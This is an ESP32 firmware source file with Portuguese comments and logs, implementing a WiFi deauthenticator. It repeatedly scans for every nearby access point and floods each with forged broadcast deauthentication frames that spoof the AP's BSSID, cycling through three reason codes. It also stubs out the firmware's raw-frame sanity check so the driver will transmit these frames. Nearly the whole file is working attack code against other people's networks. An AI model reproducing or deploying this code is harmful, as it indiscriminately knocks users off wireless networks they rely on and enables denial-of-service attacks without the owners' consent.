#include "wifi_deauther.h"
#include "led_control.h"
#include "esp_log.h"
#include "esp_wifi.h"
#include "freertos/FreeRTOS.h"
#include "freertos/task.h"
#include <string.h>
#include <stdint.h>

static const char *TAG = "wifi_deauther";
#define WIFI_SCAN_LIST_SIZE 10 // Defina o tamanho da lista de scan aqui

// Deauthentication frame templates
static const uint8_t deauth_frame_invalid_auth[] = {
    0xc0, 0x00, 0x3a, 0x01,
    0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0xf0, 0xff, 0x02, 0x00
};

static const uint8_t deauth_frame_inactivity[] = {
    0xc0, 0x00, 0x3a, 0x01,
    0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0xf0, 0xff, 0x04, 0x00
};

static const uint8_t deauth_frame_class3[] = {
    0xc0, 0x00, 0x3a, 0x01,
    0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0xf0, 0xff, 0x07, 0x00
};

static const uint8_t* get_deauth_frame_template(deauth_frame_type_t type) {
    switch (type) {
        case DEAUTH_INVALID_AUTH:
            return deauth_frame_invalid_auth;
        case DEAUTH_INACTIVITY:
            return deauth_frame_inactivity;
        case DEAUTH_CLASS3:
            return deauth_frame_class3;
        default:
            return deauth_frame_invalid_auth;
    }
}

int ieee80211_raw_frame_sanity_check(int32_t arg, int32_t arg2, int32_t arg3) {
    return 0;
}

void wifi_deauther_send_raw_frame(const uint8_t *frame_buffer, int size) {
    ESP_LOGD(TAG, "Tentando enviar frame bruto de tamanho %d", size);
    esp_err_t ret = esp_wifi_80211_tx(WIFI_IF_AP, frame_buffer, size, false);
    if (ret != ESP_OK) {
        ESP_LOGE(TAG, "Falha ao enviar frame bruto: %s (0x%x)", esp_err_to_name(ret), ret);
        led_blink_red();
    } else {
        ESP_LOGI(TAG, "Frame bruto enviado com sucesso");
        led_blink_green();
    }
}

void wifi_deauther_send_deauth_frame(const wifi_ap_record_t *ap_record, deauth_frame_type_t type) {
    const char* type_str = (type == DEAUTH_INVALID_AUTH) ? "INVALID_AUTH" :
                           (type == DEAUTH_INACTIVITY) ? "INACTIVITY" : "CLASS3";
    ESP_LOGD(TAG, "Preparando frame de deauth (%s) para %s no canal %d", type_str, ap_record->ssid, ap_record->primary);
    ESP_LOGD(TAG, "BSSID: %02x:%02x:%02x:%02x:%02x:%02x",
             ap_record->bssid[0], ap_record->bssid[1], ap_record->bssid[2],
             ap_record->bssid[3], ap_record->bssid[4], ap_record->bssid[5]);

    const uint8_t *frame_template = get_deauth_frame_template(type);
    uint8_t deauth_frame[sizeof(deauth_frame_invalid_auth)];
    memcpy(deauth_frame, frame_template, sizeof(deauth_frame_invalid_auth));
    memcpy(&deauth_frame[10], ap_record->bssid, 6); // Source MAC
    memcpy(&deauth_frame[16], ap_record->bssid, 6); // BSSID

    ESP_LOGD(TAG, "Mudando para canal %d", ap_record->primary);
    esp_err_t ret = esp_wifi_set_channel(ap_record->primary, WIFI_SECOND_CHAN_NONE);
    if (ret != ESP_OK) {
        ESP_LOGE(TAG, "Falha ao definir canal %d: %s", ap_record->primary, esp_err_to_name(ret));
        led_blink_red();
        return;
    }

    for (int i = 0; i < 30; i++) {
        ESP_LOGD(TAG, "Enviando frame de deauth %d/%d", i + 1, 30);
        wifi_deauther_send_raw_frame(deauth_frame, sizeof(deauth_frame_invalid_auth));
        vTaskDelay(100 / portTICK_PERIOD_MS);
    }
}

void wifi_deauther_task(void *pvParameters) {
    ESP_LOGI(TAG, "Iniciando task de deautenticação");
    vTaskDelay(pdMS_TO_TICKS(1000)); // Aguarda 1 segundo
  //
    static deauth_frame_type_t current_type = DEAUTH_INVALID_AUTH;
    while (1) {
        wifi_ap_record_t ap_info[WIFI_SCAN_LIST_SIZE];
        uint16_t ap_count = WIFI_SCAN_LIST_SIZE;
        memset(ap_info, 0, sizeof(ap_info));

        wifi_scan_config_t scan_config = {
            .ssid = NULL,
            .bssid = NULL,
            .channel = 0,
            .show_hidden = true,
        };

        esp_err_t ret = esp_wifi_scan_start(&scan_config, true);
        if (ret != ESP_OK) {
            ESP_LOGE(TAG, "Falha ao iniciar scan: %s", esp_err_to_name(ret));
            led_blink_red();
            vTaskDelay(1000 / portTICK_PERIOD_MS);
            continue;
        }

        ret = esp_wifi_scan_get_ap_records(&ap_count, ap_info);
        if (ret != ESP_OK) {
            ESP_LOGE(TAG, "Falha ao obter resultados do scan: %s", esp_err_to_name(ret));
            led_blink_red();
            vTaskDelay(1000 / portTICK_PERIOD_MS);
            continue;
        }

        ESP_LOGI(TAG, "Encontrados %d pontos de acesso:", ap_count);
        led_blink_blue();

        for (int i = 0; i < ap_count; i++) {
            ESP_LOGI(TAG, "AP %d: SSID=%s, RSSI=%d", i, ap_info[i].ssid, ap_info[i].rssi);
            wifi_deauther_send_deauth_frame(&ap_info[i], current_type);
        }

        current_type = (current_type + 1) % DEAUTH_TYPE_COUNT;
        const char *type_str = (current_type == DEAUTH_INVALID_AUTH) ? "INVALID_AUTH" :
                               (current_type == DEAUTH_INACTIVITY) ? "INACTIVITY" : "CLASS3";
        ESP_LOGI(TAG, "Mudando para tipo de deauth: %s", type_str);
        led_blink_blue();

        vTaskDelay(10000 / portTICK_PERIOD_MS);
    }
}
